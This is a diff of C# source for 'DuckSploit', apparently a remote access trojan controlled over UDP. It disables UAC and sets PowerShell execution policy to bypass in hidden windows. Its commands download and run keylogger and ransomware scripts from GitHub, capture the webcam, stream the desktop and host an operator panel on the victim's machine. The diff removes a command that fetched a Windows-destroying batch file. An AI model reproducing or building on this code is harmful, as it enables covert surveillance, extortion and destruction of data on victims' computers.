@@ -138,14 +138,40 @@ namespace DuckSploit
 			output = process.StandardOutput.ReadToEnd();
         }
 		
-		
+		public static void host()
+		{
+			string tempdir2 = Path.GetTempPath(); 
+			string output = "";
+			
+			if(Directory.Exists(tempdir2 + "/host"))
+			{
+				execute_cmd("start " + tempdir2 + "/host/host/launch.vbs");
+				output = "HOSTING AT http://<victim IP>.";
+			}
+			else
+			{
+				// get host.zip
+				Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/host/host.zip",tempdir2 + "/host.zip");
+				execute_cmd("powershell Expand-Archive -Path $env:TEMP\\host.zip -DestinationPath $env:TEMP\\host");
+				
+				execute_cmd("start " + tempdir2 + "/host/host/launch.vbs");
+				
+				output = "HOSTING AT http://<victim IP>.";
+			}
+		}
 		
 		
 		public static void Main(string[] args)
 		{
 			string tempdir = Path.GetTempPath(); 
+			
+			
+			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Set-ExecutionPolicy bypass -Force");
+			
+			
+			tempdir = Path.GetTempPath(); 
 			Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", tempdir + "/uacdisable.vbs");
-			execute_cmd_asadmin("call " + tempdir + "/uacdisable.vbs");
+			execute_cmd_asadmin("powershell.exe -WindowStyle hidden Start-Process " + tempdir + "/uacdisable.vbs");
 			
 			
 			string output = "";
@@ -153,7 +179,8 @@ namespace DuckSploit
 			UdpClient udpClient = new UdpClient(0);
 
 			try{
-				udpClient.Connect("IP", 443);
+				tempdir = Path.GetTempPath(); 
+				udpClient.Connect("<IP>", 53);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");
 
@@ -162,6 +189,7 @@ namespace DuckSploit
 				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);
 
 				while(true){
+					tempdir = Path.GetTempPath(); 
 					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
 					string returnData = Encoding.ASCII.GetString(receiveBytes);
 					
@@ -218,14 +246,6 @@ namespace DuckSploit
 								execute_cmd("start " + tempdir + "\\keylogger.vbs");
 							
 							}
-							else if(result[1] == "winkiller")
-							{
-								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/winkiller.bat", tempdir + "/winkiller.bat");
-							
-								execute_cmd("start " + tempdir + "\\winkiller.bat");
-							
-								output = "Trying to kill windows";
-							}
 							else if(result[1] == "--help")
 							{
 								output = "";
@@ -233,7 +253,7 @@ namespace DuckSploit
 							else if(result[1] == "ransomware")
 							{
 								
-								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/blockmousenkeyboard.ps1", tempdir + "/ransomware2.ps1");
+								// Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/blockmousenkeyboard.ps1", tempdir + "/ransomware2.ps1");
 								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/ransomware.bat", tempdir + "/ransomware.bat");
 								
 								execute_cmd_asadmin("start " + tempdir + "\\ransomware.bat");
@@ -250,6 +270,16 @@ namespace DuckSploit
 						{
 							output = "malware --help to get malware list";
 						}
+					}
+					else if(result[0] == "screenshot")
+					{
+						Download("", tempdir + "/screenshot.ps1");
+					}
+					else if(result[0] == "webcam_snap")
+					{
+						Download("https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe", tempdir + "/cam.exe");
+						execute_cmd("call " + tempdir + "/cam.exe /filename " + tempdir + "/host/host/pannel/screenshots/webcam_last.png");
+						output = "Webcam snap taken! ";
 					}
 					else if(result[0] == "open")
 					{
@@ -281,7 +311,7 @@ namespace DuckSploit
 						string line1 = "Username: " + Environment.UserName;
 						string line2 = "IPV4: " + ipv4;
 						string line3 = "HostName: " + hostname;
-						string line4 = "NetworkIP: 0.0.0.0";
+						string line4 = "NetworkIP: 0.0.0.0 ";
 						string jumpline = @"
 ";
 						output = line1 + jumpline + line2 + jumpline + line3 + jumpline + line4;
@@ -315,24 +345,23 @@ namespace DuckSploit
 							output = "Usage: notif <title> <message>";
 						}
 					}
+					else if(result[0] == "desktop_stream")
+					{
+						if(result[1] == "start")
+						{
+							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/desktop_stream.ps1", tempdir + "/deskop_stream.ps1");
+							execute_cmd("poweshell " + tempdir + "/deskop_stream.ps1");
+							output = "Desktop stream started at <victim IP>/desktop_stream.html";
+						}
+						else if(result[1] == "stop")
+						{
+							execute_cmd("taskkill /IM powershell.exe /f");
+							output = "Desktop Stream successfully shuted down! ";
+						}
+					}
 					else if(result[0] == "host")
 					{
-						if(Directory.Exists(tempdir + "/host"))
-						{
-							execute_cmd("start " + tempdir + "/host/host/launch.vbs");
-							output = "HOSTING AT <victim IP>:8080.";
-						}
-						else
-						{
-							// get host.zip
-							Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/host/host.zip",tempdir + "/host.zip");
-							execute_cmd("powershell Expand-Archive -Path $env:TEMP\\host.zip -DestinationPath $env:TEMP\\host");
-							
-							execute_cmd("start " + tempdir + "/host/host/launch.vbs");
-							
-							output = "HOSTING AT <victim IP>:8080";
-						}
-						
+						host();
 					}
 					
 					Console.WriteLine(output);
